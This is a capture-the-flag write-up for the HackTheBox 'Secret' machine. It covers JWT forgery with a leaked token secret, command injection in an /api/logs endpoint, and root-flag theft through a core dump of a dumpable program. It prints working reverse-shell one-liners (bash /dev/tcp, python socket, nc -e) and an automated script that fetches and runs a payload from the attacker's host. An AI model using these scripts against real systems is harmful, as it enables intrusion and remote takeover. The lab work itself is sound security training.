# Secret

## Remote Discovery

> Note: the box IP has been added to the `/etc/hosts` file as `secret.htb`

### Nmap Scan

An `nmap -Sc -Sv secret.htb` yields:
```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
...
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
...
3000/tcp open  http    Node.js (Express middleware)
...
```

looks like we have an http server, lets use some gobuster:

### Gobuster
```
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://secret.htb | tee gb_common.txt
...
/api                  (Status: 200) [Size: 93]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/docs                 (Status: 200) [Size: 20720]
/download             (Status: 301) [Size: 183] [--> /download/]
```

### Source Code and User Creation/Access
Looking around at the site, we can find that there is some source code, as well as docs explaining the code. It appears that the current site is running the source code you can download from the site... So now we just need to exploit it. We can start with user creation.

The docs outline a way to send a POST request to create a user, we can accomplish this with such a command:
```bash
$ curl -H "Content-Type: application/json" -d '{"name":"tester","email":"blaine.bublitz@gmail.com","password":"tester"}' http://secret.htb:3000/api/user/register

{"user":"tester"}
```

This creates the user `tester` with the password `tester`. It is of note, that not all emails will work, I found this one in the source code and just tried it. I doubt we'll actually need an email for this exploit, so anything that works will be fine.

The next steps outlined in the docs is to send a POST request to login and we should recieve an auth token:
```bash
$ curl -H "Content-Type: application/json" -d '{"email":"blaine.bublitz@gmail.com","password":"tester"}' http://secret.htb:3000/api/user/login

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTgxNTMzMDdlMDQyMDA0Nzk4OWJhYWUiLCJuYW1lIjoidGVzdGVyIiwiZW1haWwiOiJibGFpbmUuYnVibGl0ekBnbWFpbC5jb20iLCJpYXQiOjE2MzU4NjU5NzZ9.UF6A5i8uOlilGot6_ipbpjkoifzd8KrSmlSKsL_r7tw
```

Knowing this, we need to try to gain access to the admin account. Fortunately, there is the token secret found in the git history in the files you can download from the site. We can use this to generate a token using jwt:
```bash
TOKEN_SECRET=secret_from_the_history
PAYLOAD='{_id:"618153307e0420047989baae",name:"theadmin",email:"root@dasith.works",iat:1635865976}'
TOKEN=$( node -e "const jwt = require('jsonwebtoken'); console.log(jwt.sign($PAYLOAD, '$TOKEN_SECRET' ));" )
```

We can now use this auth token for some exploit goodness.

## Remote Code Execution

Using the token we generate from the admin account, we can run some remote code execution through the `/api/logs` page. By url encoding some commands and slapping that on the file param, we can get some execution, lets make a script to make this easier:
```bash
$ cat run_command.sh

#!/bin/bash
TOKEN=$1
COMMAND=$2
COMMAND=$( node -e "console.log(encodeURIComponent(\"$COMMAND\"))" )
echo -e $(curl -s -H "auth-token: $TOKEN" -X GET "http://secret.htb:3000/api/logs?file=$COMMAND")
```

With this, we can use some reverse shell magic to get a reverse shell. For conveniance, I've created a script that tries a few different reverse shell techniques:
```bash
$ cat remote_shell.sh

#!/bin/bash
# Usage ./remote_shell.sh IP_ADDRESS PORT

IPADDR=$1
PORT=$2

echo "Attempting to connect through bash and tcp..."
bash -i >& /dev/tcp/$IPADDR/$PORT 0>&1 && exit 1 || echo "Failed to use bash -i with tcp"

echo "Attempting python connection..."
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$IPADDR'",'$PORT'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' && exit 1 || echo "Failed at python connection"

echo "Attempting a netcat connection..."
nc -e /bin/sh $IPADDR $PORT && exit 1 || echo "Failed netcat connection"
```

Using this, we get the file to the server using a python http server, and a `./run_command "curl http://IPADDRESS/remote_shell.sh > /tmp/remote_shell.sh"` and a `./run_command "/bin/bash /tmp/remote_shell.sh IPADDR PORT"` while starting a netcat listener on a given port, then we've got a shell!

To make this easier, I've made a script to automate this:
```bash
$ cat shell.sh

#!/bin/bash

# Get some vars
if [[ -z $1 ]]; then
        PORT=5001
else
        PORT=$1
fi
TMPFILE=tmpfile19527613
TOKEN_SECRET=gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
PAYLOAD='{_id:"618153307e0420047989baae",name:"theadmin",email:"root@dasith.works",iat:1635865976}'
TOKEN=$( node -e "const jwt = require('jsonwebtoken'); console.log(jwt.sign($PAYLOAD, '$TOKEN_SECRET' ));" )
IP=$(ifconfig tun0 | grep 'inet ' | cut -d: -f2 | awk '{print $2}')
cat <<EOF> $TMPFILE
bash -i >& /dev/tcp/$IP/$PORT 0>&1 && exit 1
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$IP'",'$PORT'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' && exit 1
nc -e /bin/sh $IP $PORT && exit 1
xterm -display $IP:$PORT && exit 1
EOF
C1="nofile; curl http://$IP/$TMPFILE > /tmp/shell.sh"
C1=$( node -e "console.log(encodeURIComponent(\"nofile; pwd; $C1\"))" )
C2="nofile; /bin/bash /tmp/shell.sh $IP $PORT"
C2=$( node -e "console.log(encodeURIComponent(\"nofile; pwd; $C2\"))" )
C3="nofile; rm /tmp/shell.sh"
C3=$( node -e "console.log(encodeURIComponent(\"nofile; pwd; $C3\"))" )

# Define cleanup function
function cleanup {
        rm $TMPFILE
        echo "Removing shell file on server"
        res=$(echo -e $(curl -s -H "auth-token: $TOKEN" -X GET "http://secret.htb:3000/api/logs?file=$C3"))
}
trap cleanup EXIT

# Start http server
python3 -m http.server 80 &
pid=$!
sleep 1

# Get the reverse script
res=$(echo -e $(curl -s -H "auth-token: $TOKEN" -X GET "http://secret.htb:3000/api/logs?file=$C1"))
#echo $res # for debugging
sleep 1

# Stop the http server
kill "${pid}"

# Start a nc listener and run the connection
{ sleep 2; res=$(echo -e $(curl -s -H "auth-token: $TOKEN" -X GET "http://secret.htb:3000/api/logs?file=$C2")); } &
nc -lvnp $PORT
```

## Privesc

Looking around for an exploit to get the root flag, we can find the script `/opt/count` with corresponding c code in `/opt/code.c`. This program appears to be able to read the root flag as `printf "/root/root.txt\nn" | /opt/count"` will give use the number of characters, words, and lines in the file. We might be able to leverage this program to show us the root flag.

We know that the program has `prctl(PR_SET_DUMPABLE, 1);`, which means that we can kill the file while its trying to write to a file and read through the dump. For this exploit, we will need 2 shells:

#### Shell 1
```bash
dasith@secret:~/local-web$ /opt/count
/root.txt
y
```

### Shell 2
```bash
dasith@secret:~/local-web$ ps aux | grep /opt/count
root         839  0.0  0.1 235672  7472 ?        Ssl  14:37   0:00 /usr/lib/accountsservice/accounts-daemon
dasith      1229  0.0  0.0   2488   580 ?        S    14:43   0:00 /opt/count -p
dasith      1231  0.0  0.0   6432   672 ?        S    14:44   0:00 grep --color=auto count

dasith@secret:~/local-web$ kill 1229
```

This creates a dump file in `/var/crash`, and we can use the `apport-unpack` command to unpack the crash data:
```
dasith@secret:~/local-web$ apport-unpack /var/crash/_opt_count.1000.crash /tmp/dump
dasith@secret:~/local-web$ strings /tmp/dump/CoreDump
...
ROOT_FLAG
...
```

Boom! Finished with the root flag (redacted).
